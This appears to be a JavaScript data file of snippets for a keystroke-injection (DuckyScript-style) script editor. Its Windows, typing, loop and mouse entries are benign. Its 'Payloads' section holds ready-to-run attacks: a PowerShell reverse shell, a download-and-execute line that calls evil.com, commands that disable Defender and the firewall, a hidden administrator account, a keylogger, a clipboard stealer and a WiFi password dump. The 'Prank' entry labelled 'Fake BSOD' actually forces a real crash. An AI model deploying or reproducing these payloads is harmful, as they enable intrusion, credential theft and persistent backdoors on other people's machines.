const snippetsData = [
  {
    category: 'Windows',
    name: 'Open Command Prompt (Admin)',
    code: 'GUI r\nDELAY 500\nSTRING cmd\nCTRL SHIFT ENTER\nDELAY 2000\nALT y',
  },
  {
    category: 'Windows',
    name: 'Open PowerShell (Admin)',
    code: 'GUI r\nDELAY 500\nSTRING powershell\nCTRL SHIFT ENTER\nDELAY 2000\nALT y',
  },
  { category: 'Windows', name: 'Open Run Dialog', code: 'GUI r\nDELAY 500' },
  { category: 'Windows', name: 'Lock Workstation', code: 'GUI l' },
  { category: 'Windows', name: 'Open Task Manager', code: 'CTRL SHIFT ESC' },
  { category: 'Windows', name: 'Show Desktop', code: 'GUI d' },
  { category: 'Windows', name: 'Switch Window', code: 'ALT TAB' },
  { category: 'Windows', name: 'Open File Explorer', code: 'GUI e' },
  { category: 'Windows', name: 'Open Settings', code: 'GUI i' },
  { category: 'Windows', name: 'Open Action Center', code: 'GUI a' },

  {
    category: 'Typing',
    name: 'Fast String + Enter',
    code: 'STRINGLN your_text_here',
  },
  {
    category: 'Typing',
    name: 'Multi-line String Block',
    code: 'STRING_BLOCK\nyour text here\nEND_STRING',
  },
  {
    category: 'Typing',
    name: 'String with Variable',
    code: 'VAR $msg = "Hello"\nSTRING $msg\nENTER',
  },
  {
    category: 'Typing',
    name: 'Typing with Newlines',
    code: 'STRINGLN Line 1\nSTRINGLN Line 2',
  },
  {
    category: 'Typing',
    name: 'Typing Special Characters',
    code: 'STRING  !@#$%^&*()_+',
  },
  {
    category: 'Typing',
    name: 'Typing Long Text Block',
    code: 'STRING_BLOCK\nThis is a very long text that wraps\nmultiple lines without needing separate STRING commands.\nEND_STRING',
  },

  {
    category: 'Timing',
    name: 'Random Delay (100-1000ms)',
    code: 'VAR $delay = $_RANDOM_INT\nDELAY $delay',
  },
  {
    category: 'Timing',
    name: 'Define Constant Delay',
    code: 'DEFINE SHORT_DELAY 500\nDELAY SHORT_DELAY',
  },
  {
    category: 'Timing',
    name: 'Default Delay (global)',
    code: 'DEFAULT_DELAY 100\nSTRING a\nSTRING b\nSTRING c',
  },
  {
    category: 'Timing',
    name: 'Math Expression in Delay',
    code: 'DEFINE BASE 1000\nDELAY BASE - 200',
  },
  {
    category: 'Timing',
    name: 'Delay with Variable',
    code: 'VAR $d = 1500\nDELAY $d',
  },
  {
    category: 'Timing',
    name: 'Wait for Key Release',
    code: 'HOLD SHIFT\nDELAY 500\nRELEASE SHIFT\nDELAY 200',
  },

  {
    category: 'Variables',
    name: 'Define String Variable',
    code: 'VAR $message = "Hello OverQuack!"\nSTRING $message',
  },
  {
    category: 'Variables',
    name: 'Variable Arithmetic',
    code: 'VAR $count = 5\n$count = $count + 1\nPRINT Count is $count',
  },
  {
    category: 'Variables',
    name: 'Boolean Variable',
    code: 'VAR $flag = 1\nIF ($flag == 1)\n    PRINT Flag is true\nEND_IF',
  },
  {
    category: 'Variables',
    name: 'String Concatenation',
    code: 'VAR $first = "Hello"\nVAR $second = "World"\nSTRING $first $second',
  },
  {
    category: 'Variables',
    name: 'Define Constant (DEFINE)',
    code: 'DEFINE PI 3.14159\nPRINT PI',
  },
  {
    category: 'Variables',
    name: 'Using $_RANDOM_INT',
    code: 'PRINT $_RANDOM_INT',
  },
  {
    category: 'Variables',
    name: 'Using $_RANDOM_NUMBER:6',
    code: 'VAR $code = $_RANDOM_NUMBER:6\nPRINT $code',
  },
  {
    category: 'Variables',
    name: 'Complex Expression',
    code: 'VAR $result = (10 + 5) * 2 / 3\nPRINT $result',
  },

  {
    category: 'Mouse',
    name: 'Move & Click',
    code: 'MOUSE_MOVE 100 100\nDELAY 100\nMOUSE_CLICK LEFT',
  },
  { category: 'Mouse', name: 'Right Click', code: 'MOUSE_CLICK RIGHT' },
  {
    category: 'Mouse',
    name: 'Double Click',
    code: 'MOUSE_CLICK LEFT\nDELAY 50\nMOUSE_CLICK LEFT',
  },
  { category: 'Mouse', name: 'Scroll Down', code: 'MOUSE_SCROLL 5' },
  { category: 'Mouse', name: 'Scroll Up', code: 'MOUSE_SCROLL -5' },
  { category: 'Mouse', name: 'Jiggle (1 second)', code: 'JIGGLE_MOUSE 1000' },
  {
    category: 'Mouse',
    name: 'Background Jiggle (infinite)',
    code: 'BACKGROUND_JIGGLE_MOUSE INF 5 0.2',
  },
  {
    category: 'Mouse',
    name: 'Move Relative',
    code: 'MOUSE_MOVE 50 -30\nMOUSE_CLICK LEFT',
  },

  {
    category: 'Conditionals',
    name: 'Basic IF',
    code: 'IF ($x == 1)\n    PRINT x is 1\nEND_IF',
  },
  {
    category: 'Conditionals',
    name: 'IF / ELSE',
    code: 'IF ($value > 10)\n    PRINT More than 10\nELSE\n    PRINT 10 or less\nEND_IF',
  },
  {
    category: 'Conditionals',
    name: 'ELSE IF Chain',
    code: 'IF ($score >= 90)\n    PRINT Grade A\nELSE IF ($score >= 80)\n    PRINT Grade B\nELSE\n    PRINT Grade C\nEND_IF',
  },
  {
    category: 'Conditionals',
    name: 'Check Caps Lock',
    code: 'IF ($_CAPSLOCK_ON == 1)\n    CAPSLOCK\nELSE\n    PRINT Caps is off\nEND_IF',
  },
  {
    category: 'Conditionals',
    name: 'Check Num Lock',
    code: 'IF ($_NUMLOCK_ON == 0)\n    NUMLOCK\nEND_IF',
  },
  {
    category: 'Conditionals',
    name: 'Nested IF',
    code: 'IF ($a == 1)\n    IF ($b == 2)\n        PRINT Both true\n    END_IF\nEND_IF',
  },

  {
    category: 'Loops',
    name: 'Simple WHILE loop',
    code: 'VAR $i = 0\nWHILE ($i < 5)\n    PRINT $i\n    $i = $i + 1\nEND_WHILE',
  },
  {
    category: 'Loops',
    name: 'Infinite loop with break',
    code: 'VAR $stop = 0\nWHILE ($stop == 0)\n    PRINT Running...\n    DELAY 1000\nEND_WHILE',
  },
  {
    category: 'Loops',
    name: 'Loop with condition',
    code: 'VAR $count = 10\nWHILE ($count > 0)\n    PRINT $count\n    $count = $count - 1\n    DELAY 500\nEND_WHILE',
  },
  {
    category: 'Loops',
    name: 'Nested loops',
    code: 'VAR $i = 0\nWHILE ($i < 3)\n    VAR $j = 0\n    WHILE ($j < 3)\n        STRING $i,$j\n        $j = $j + 1\n    END_WHILE\n    $i = $i + 1\nEND_WHILE',
  },

  {
    category: 'Functions',
    name: 'Define & Call Function',
    code: 'FUNCTION myFunc()\n    PRINT Inside function\nEND_FUNCTION\nmyFunc()',
  },
  {
    category: 'Functions',
    name: 'Function with multiple lines',
    code: 'FUNCTION openNotepad()\n    GUI r\n    DELAY 500\n    STRING notepad\n    ENTER\nEND_FUNCTION\nopenNotepad()',
  },
  {
    category: 'Functions',
    name: 'Function calling another',
    code: 'FUNCTION a()\n    PRINT A\nEND_FUNCTION\nFUNCTION b()\n    a()\n    PRINT B\nEND_FUNCTION\nb()',
  },
  {
    category: 'Functions',
    name: 'Function with variables',
    code: 'VAR $global = 10\nFUNCTION test()\n    $global = $global * 2\nEND_FUNCTION\ntest()\nPRINT $global',
  },
  {
    category: 'Functions',
    name: 'Reusable Windows Info',
    code: 'FUNCTION getSysInfo()\n    GUI r\n    DELAY 500\n    STRING cmd\n    ENTER\n    DELAY 800\n    STRING systeminfo > %TEMP%\\sysinfo.txt\n    ENTER\nEND_FUNCTION',
  },
  {
    category: 'Functions',
    name: 'Function with delay parameter',
    code: 'DEFINE WAIT 1000\nFUNCTION waitAndType()\n    DELAY WAIT\n    STRING Done\nEND_FUNCTION\nwaitAndType()',
  },

  {
    category: 'Custom Support',
    name: 'Hardware Reconfiguration Loop',
    code: 'DISABLE_STRIP\nDELAY 200\nENABLE_STRIP\nRESTART_PAYLOAD',
  },
  {
    category: 'Custom Support',
    name: 'NUMLOCK State Check',
    code: 'IF ($_NUMLOCK_ON == 1)\n    PRINT Numeric Lock Active\nEND_IF',
  },
  {
    category: 'Custom Support',
    name: 'Check Caps Lock State',
    code: 'IF ($_NUMLOCK_ON == 1)\n    PRINT Numeric Lock Active\nEND_IF',
  },
  { category: 'Custom Support', name: 'Get BSSID', code: 'PRINT $_BSSID' },
  {
    category: 'Custom Support',
    name: 'Generate Random Number',
    code: 'PRINT $_RANDOM_NUMBER:8',
  },
  {
    category: 'Custom Support',
    name: 'Generate Random Letter',
    code: 'PRINT $_RANDOM_LETTER:6',
  },
  {
    category: 'Custom Support',
    name: 'Generate Random Mixed',
    code: 'PRINT $_RANDOM_CHAR:12',
  },
  {
    category: 'Custom Support',
    name: 'Random Upper Case',
    code: 'PRINT $_RANDOM_UPPERCASE_LETTER:4',
  },
  {
    category: 'Custom Support',
    name: 'Random Lower Case',
    code: 'PRINT $_RANDOM_LOWERCASE_LETTER:4',
  },
  {
    category: 'Custom Support',
    name: 'Random Special Char',
    code: 'PRINT $_RANDOM_SPECIAL:3',
  },

  {
    category: 'Information',
    name: 'Grab IP Address',
    code: 'GUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 800\nSTRING ipconfig | findstr "IPv4"\nENTER',
  },
  {
    category: 'Information',
    name: 'System Info to File',
    code: 'GUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 800\nSTRING systeminfo > %TEMP%\\sysinfo.txt\nENTER',
  },
  {
    category: 'Information',
    name: 'List Running Processes',
    code: 'GUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 800\nSTRING tasklist > %TEMP%\\processes.txt\nENTER',
  },
  {
    category: 'Information',
    name: 'WiFi Profiles',
    code: 'GUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 800\nSTRING netsh wlan show profiles\nENTER',
  },
  {
    category: 'Information',
    name: 'ARP Table',
    code: 'GUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 800\nSTRING arp -a\nENTER',
  },
  {
    category: 'Information',
    name: 'DNS Cache',
    code: 'GUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 800\nSTRING ipconfig /displaydns\nENTER',
  },
  {
    category: 'Information',
    name: 'Environment Variables',
    code: 'GUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 800\nSTRING set\nENTER',
  },
  {
    category: 'Information',
    name: 'Installed Software (WMIC)',
    code: 'GUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 800\nSTRING wmic product get name,version\nENTER',
  },
  {
    category: 'Information',
    name: 'Disk Drives Info',
    code: 'GUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 800\nSTRING wmic logicaldisk get size,freespace,caption\nENTER',
  },
  {
    category: 'Information',
    name: 'Open Ports (netstat)',
    code: 'GUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 800\nSTRING netstat -an\nENTER',
  },
  {
    category: 'Information',
    name: 'Current User Info',
    code: 'GUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 800\nSTRING whoami /all\nENTER',
  },
  {
    category: 'Information',
    name: 'System Uptime',
    code: 'GUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 800\nSTRING systeminfo | find "System Boot Time"\nENTER',
  },

  {
    category: 'Payloads',
    name: 'Reverse Shell (Simple)',
    code: "GUI r\nDELAY 500\nSTRING powershell -NoP -NonI -W Hidden -Exec Bypass -c \"$c=New-Object Net.Sockets.TCPClient('IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=iex $d 2>&1|Out-String;$sb=$r+'PS '+(pwd).Path+'> ';$sb=[Text.Encoding]::ASCII.GetBytes($sb);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\"\nCTRL SHIFT ENTER\nDELAY 2000\nALT y",
  },
  {
    category: 'Payloads',
    name: 'Disable Windows Defender',
    code: 'GUI r\nDELAY 500\nSTRING powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"\nCTRL SHIFT ENTER\nDELAY 2000\nALT y',
  },
  {
    category: 'Payloads',
    name: 'Add User (Admin)',
    code: 'GUI r\nDELAY 500\nSTRING cmd\nCTRL SHIFT ENTER\nDELAY 2000\nALT y\nDELAY 500\nSTRING net user username password /add\nENTER\nSTRING net localgroup administrators username /add\nENTER',
  },
  {
    category: 'Payloads',
    name: 'Enable RDP',
    code: "GUI r\nDELAY 500\nSTRING powershell -Command \"Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -name 'fDenyTSConnections' -value 0; Enable-NetFirewallRule -DisplayGroup 'Remote Desktop'\"\nCTRL SHIFT ENTER\nDELAY 2000\nALT y",
  },
  {
    category: 'Payloads',
    name: 'Download and Execute',
    code: 'GUI r\nDELAY 500\nSTRING powershell -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://evil.com/payload.ps1\')"\nENTER',
  },
  {
    category: 'Payloads',
    name: 'Keylogger (PowerShell)',
    code: 'GUI r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -Command "$logFile=\'%TEMP%\\keys.log\';Add-Type -AssemblyName System.Windows.Forms;$listener=New-Object System.Windows.Forms.TextBox;$listener.KeyPress += {$global:key=$_.KeyChar;$global:key|Out-File $logFile -Append};$form=New-Object System.Windows.Forms.Form;$form.Controls.Add($listener);$form.ShowDialog()"\nCTRL SHIFT ENTER\nDELAY 2000\nALT y',
  },
  {
    category: 'Payloads',
    name: 'Clipboard Stealer',
    code: 'GUI r\nDELAY 500\nSTRING powershell -Command "Get-Clipboard > %TEMP%\\clip.txt"\nENTER',
  },
  {
    category: 'Payloads',
    name: 'Screen Capture',
    code: 'GUI r\nDELAY 500\nSTRING powershell -Command "Add-Type -AssemblyName System.Windows.Forms;Add-Type -AssemblyName System.Drawing;$bmp=New-Object Drawing.Bitmap([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);$g=[Drawing.Graphics]::FromImage($bmp);$g.CopyFromScreen(0,0,0,0,$bmp.Size);$bmp.Save(\'%TEMP%\\screenshot.png\')\"\nENTER',
  },
  {
    category: 'Payloads',
    name: 'WiFi Password Dump',
    code: 'GUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 800\nSTRING netsh wlan export profile key=clear folder=%TEMP%\nENTER',
  },
  {
    category: 'Payloads',
    name: 'Persistent Startup Script',
    code: "GUI r\nDELAY 500\nSTRING powershell -Command \"$wsh = New-Object -ComObject WScript.Shell;$shortcut = $wsh.CreateShortcut('$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.lnk');$shortcut.TargetPath = 'C:\\path\\to\\payload.exe';$shortcut.Save()\"\nENTER",
  },
  {
    category: 'Payloads',
    name: 'Disable Firewall',
    code: 'GUI r\nDELAY 500\nSTRING cmd\nCTRL SHIFT ENTER\nDELAY 2000\nALT y\nDELAY 500\nSTRING netsh advfirewall set allprofiles state off\nENTER',
  },
  {
    category: 'Payloads',
    name: 'Create Hidden Admin Account',
    code: 'GUI r\nDELAY 500\nSTRING cmd\nCTRL SHIFT ENTER\nDELAY 2000\nALT y\nDELAY 500\nSTRING net user hacker$ StrongPass123 /add\nENTER\nSTRING net localgroup administrators hacker$ /add\nENTER\nSTRING reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v hacker$ /t REG_DWORD /d 0 /f\nENTER',
  },

  {
    category: 'Prank',
    name: 'Open Notepad and Type',
    code: 'GUI r\nDELAY 500\nSTRING notepad\nENTER\nDELAY 1000\nSTRING You have been hacked by OverQuack!\nENTER',
  },
  {
    category: 'Prank',
    name: 'Optical Drive Eject',
    code: 'GUI r\nDELAY 500\nSTRING powershell (New-Object -com "WMPlayer.OCX.7").cdromcollection.item(0).eject()\nENTER',
  },
  {
    category: 'Prank',
    name: 'Fake Virus Popup',
    code: "GUI r\nDELAY 500\nSTRING powershell -Command \"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Your system has been infected!', 'Virus Alert')\"\nENTER",
  },
  {
    category: 'Prank',
    name: 'Endless Beeps',
    code: 'GUI r\nDELAY 500\nSTRING powershell -Command "for ($i=0;$i -lt 50;$i++) { [System.Console]::Beep(1000,500) }"\nENTER',
  },
  {
    category: 'Prank',
    name: 'Open Many Notepads',
    code: 'GUI r\nDELAY 500\nSTRING notepad\nENTER\nREPEAT LINES=1 TIMES=10',
  },
  {
    category: 'Prank',
    name: 'Fake BSOD (Blue Screen)',
    code: 'GUI r\nDELAY 500\nSTRING powershell -Command "Add-Type -TypeDefinition @" -WindowStyle Hidden\nSTRING "using System;using System.Runtime.InteropServices;public class BSOD{[DllImport(""ntdll.dll"",SetLastError=true)]public static extern int RtlAdjustPrivilege(int Privilege,bool bEnablePrivilege,bool IsThreadPrivilege,out bool PreviousValue);[DllImport(""ntdll.dll"",SetLastError=true)]public static extern int NtRaiseHardError(int ErrorStatus,int NumberOfParameters,int UnicodeStringParameterPointer,IntPtr Parameters,int ValidResponseOptions,out int Response);}"\nSTRING "$BSOD=[BSOD]::new();$temp=[bool]0;$BSOD::RtlAdjustPrivilege(19,1,0,[ref]$temp);[int]$Response;$BSOD::NtRaiseHardError(3221225494,0,0,[System.IntPtr]::Zero,6,[ref]$Response)"\nENTER',
  },
  {
    category: 'Prank',
    name: 'Mouse Disabler (Hold)',
    code: 'MOUSE_MOVE 0 0\nHOLD CTRL ALT\nDELAY 5000\nRELEASE CTRL ALT',
  },
  {
    category: 'Prank',
    name: 'Fake Windows Update',
    code: "GUI r\nDELAY 500\nSTRING powershell -Command \"Add-Type -AssemblyName System.Windows.Forms; $form=New-Object Windows.Forms.Form;$form.Text='Windows Update';$label=New-Object Windows.Forms.Label;$label.Text='Installing critical security updates – 37% complete';$form.Controls.Add($label);$form.ShowDialog()\"\nENTER",
  },

  {
    category: 'OverQuack',
    name: 'WiFi Network Connect',
    code: 'DEFINE NET_DELAY 2000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 800\nSTRING netsh wlan connect name="$_SSID"\nENTER\nDELAY NET_DELAY\nPRINT Connected to $_SSID',
  },
  {
    category: 'OverQuack',
    name: 'Variable from Random',
    code: 'VAR $uname = $_RANDOM_LETTER:8\nVAR $pass = $_RANDOM_NUMBER:10\nSTRING $uname\nENTER\nSTRING $pass\nENTER',
  },
  {
    category: 'OverQuack',
    name: 'Conditional Restart',
    code: 'IF ($_CAPSLOCK_ON == 1)\n    PRINT CapsLock on – restarting\n    RESTART_PAYLOAD\nELSE\n    PRINT Normal execution\nEND_IF',
  },
  {
    category: 'OverQuack',
    name: 'Delayed Restart',
    code: 'PRINT Restarting in 5 seconds...\nDELAY 5000\nRESTART_PAYLOAD',
  },
  {
    category: 'OverQuack',
    name: 'Stop Payload on Condition',
    code: 'IF ($_NUMLOCK_ON == 0)\n    PRINT NumLock off – stopping\n    STOP_PAYLOAD\nEND_IF',
  },
  {
    category: 'OverQuack',
    name: 'Select Layout based on BSSID',
    code: 'IF ($_BSSID == "00:11:22:33:44:55")\n    SELECT_LAYOUT WIN_DE\nELSE\n    SELECT_LAYOUT US\nEND_IF',
  },
  {
    category: 'OverQuack',
    name: 'Background Jiggle (2 sec)',
    code: 'BACKGROUND_JIGGLE_MOUSE 2000 5 0.1\nPRINT Mouse jiggling in background for 2 seconds.',
  },
  {
    category: 'OverQuack',
    name: 'Repeat Last Command Block',
    code: 'STRINGLN Hello\nSTRINGLN World\nREPEAT LINES=2 TIMES=5',
  },
];
